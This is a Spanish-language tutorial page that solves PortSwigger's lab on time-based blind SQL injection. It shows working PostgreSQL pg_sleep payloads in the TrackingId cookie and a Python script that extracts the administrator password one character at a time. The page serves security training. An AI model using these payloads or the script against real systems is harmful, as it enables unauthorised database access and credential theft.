---
layout: default
title: Ejercicio práctico
permalink: /injection_types/blind/time_based_type/time_based_exercise
nav_order: 1
parent: 4.3 Basadas en tiempo
grand_parent: 4. Inyecciones ciegas
---

# Ejercicio practico de inyección ciega basada en tiempo

> Ejercicio basado en el laboratorio "Lab: Blind SQL injection with time delays and information retrieval" de Web Security Academy (PortSwigger).


## Consigna

Este laboratorio contiene una vulnerabilidad de inyección de SQL ciega. La aplicación usa una cookie de rastreo (*tracking*) para análisis y ejecuta una consulta SQL con el valor de esta cookie. 

Los resultados de la consulta SQL no se devuelven, y la aplicación no responde de manera diferente en función de si la consulta devuelve filas o causa un error. Sin embargo, dado que la consulta se ejecuta sincrónicamente, es posible activar retrasos de tiempo condicionales para inferir información.

La base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username` y `password`.

Para resolver el laboratorio, obtener el usuario y contraseña del usuario `administrator` e iniciar sesión con estas credenciales.

## Resolución manual + automatización con Python

Luego de un primer acceso a la aplicación y por sugerencia de la consigna, analizando las cookies se observa que figura una llamada `TrackingId` con un valor alfanumérico. Para modificarla en pedidos siguientes es pertinente usar un proxy de ataque como OWASP ZAP para practicidad.

Inicialmente podemos validar la existencia de la vulnerabilidad de cualquiera de las formas mencionadas en [4.3 Basadas en tiempo](/test-page/injection_types/blind/time_based_type/time_based_exercise) para cada tipo de base. Por lo que modificando `TrackingId` de la siguiente manera se puede validar la que resulta válida:

```
TrackingId=ggg'||(SELECT pg_sleep(5))--
```

De este *payload* válido se deduce que el DBMS es PostgreSQL y variando los segundos de demora en `pg_sleep` se logra inferir un tiempo lo más bajo posible **que no se confunda con una demora común** de respuesta. 

Antes de extraer la contraseña del administrador y es pertinente conocer la longitud de la misma. Basado en el ejemplo de demora condicional para PostgreSQL que se encuentra en la [SQL injection cheat sheet de PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet), este es un posible fragmento de SQL que funciona:

```sql
SELECT CASE WHEN (LENGTH(password)=1) 
    THEN pg_sleep(5) ELSE pg_sleep(0) END 
    FROM users WHERE username='administrator'
```

Reemplazándolo en la cookie:

```
TrackingId=ggg'||(SELECT CASE WHEN (LENGTH(password)=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
```

De esta manera solo se debe ir variando el número de largo comparado del número, manualmente o automatizado como se explica en los ejercicios anteriores (con *Fuzzer* de OWASP ZAP o *Intruder*/*Turbo Intruder* de Burp Suite). Como en los otros ejercicios, la longitud es 20.

Ahora debemos extraer la contraseña, teniendo en cuenta que conocemos la tabla, las columnas y hasta el nombre del usuario (administrador), una forma simple y eficaz sería la siguiente:
`TrackingId=ggg'||(SELECT case when substring(password,%d,1)='%s' then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')--+-;`

De esta manera podemos ir probando entre las diferentes combinaciones donde esta %d (para ir iterando entre cada posición de la contraseña del 1 al 20) y %s (para iterar sobre todas posibles opciones las cuales incluyen los caracteres alfanuméricos).

Para automatizar las consultas podemos apoyarnos en un script en Python3:

```python
#!/usr/bin/python3
import requests,time,sys,string

main_url = 'https://BURPSUITE-LAB/filter?category=Pets' #URL Del laboratorio

characters = string.ascii_lowercase + string.digits #Caracteres alfanuméricos

def makeRequest():
    print("Iniciando SQLi")
    password = ""

    for position in range(1,21): #Posiciones de la contraseña del 0 al 20
        for character in characters:

            cookies = {
                    'TrackingId':"XYZ'||(select case when substring(password,%d,1)='%s' then pg_sleep(2) else pg_sleep(0) end from users where username='administrator')-- -" %(position,character),
                    'session':'session Cookie'}
            time_start=time.time()
            r = requests.get(main_url, cookies=cookies)
            time_end = time.time()

            if time_end - time_start > 2: #Tiempo de respuesta mayor a 2 segundos (inyeccion exitosa)
                password += character
                print("Password: %s (%s)"%(password,position))
                break

if __name__ == '__main__':
    makeRequest()
```
Para este ejemplo se tuvo en cuenta que la contraseña del administrador solo posee letras minúsculas y números. En un caso diferente, tendríamos que incluir dentro del arreglo de "characters" todos los caracteres posibles para la contraseña (Letras mayúsculas, caracteres especiales etc).


La desventaja de esta tecnica es que requiere una alta cantidad de consultas para probar todas las  posibles combinaciones, si bien se realizara mediante un script para automatizarlo, si lo que queremos es optimizar la cantidad de consultas, podemos apoyarnos en los consejos de optimización nombrados en la sección [4.1 Inyeccion SQL ciega con respuestas condicionales](https://spassarop.github.io/test-page/injection_types/blind/conditional_type#optimizaciones)



